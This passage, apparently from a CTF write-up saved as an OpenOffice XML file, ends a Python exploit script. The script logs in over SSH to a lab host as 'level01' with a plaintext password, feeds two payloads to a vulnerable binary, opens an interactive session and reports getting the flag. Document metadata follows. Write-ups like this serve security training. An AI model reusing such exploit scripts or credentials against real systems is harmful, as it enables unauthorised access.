      <text:p text:style-name="P12"><text:span text:style-name="T9">s</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">ssh(host=</text:span><text:span text:style-name="T10">'192.168.1.3'</text:span><text:span text:style-name="T9">,</text:span> <text:span text:style-name="T9">port=</text:span><text:span text:style-name="T12">4242</text:span><text:span text:style-name="T9">,</text:span> <text:span text:style-name="T9">user=</text:span><text:span text:style-name="T10">"level01"</text:span><text:span text:style-name="T9">,</text:span> <text:span text:style-name="T9">password=</text:span><text:span text:style-name="T10">"uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL"</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">p</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">s.process(</text:span><text:span text:style-name="T10">'/home/users/level01/./level01'</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T9">p.recvline(</text:span><text:span text:style-name="T12">2</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P13">p.sendline(payload_1)</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">p.recvline(</text:span><text:span text:style-name="T12">3</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P13">p.sendline(payload_2)</text:p>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P8">Got flag<text:span text:style-name="T2">.</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0M58S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-03T14:32:19.43</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="3" meta:object-count="0" meta:page-count="6" meta:paragraph-count="102" meta:word-count="932" meta:character-count="6128"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>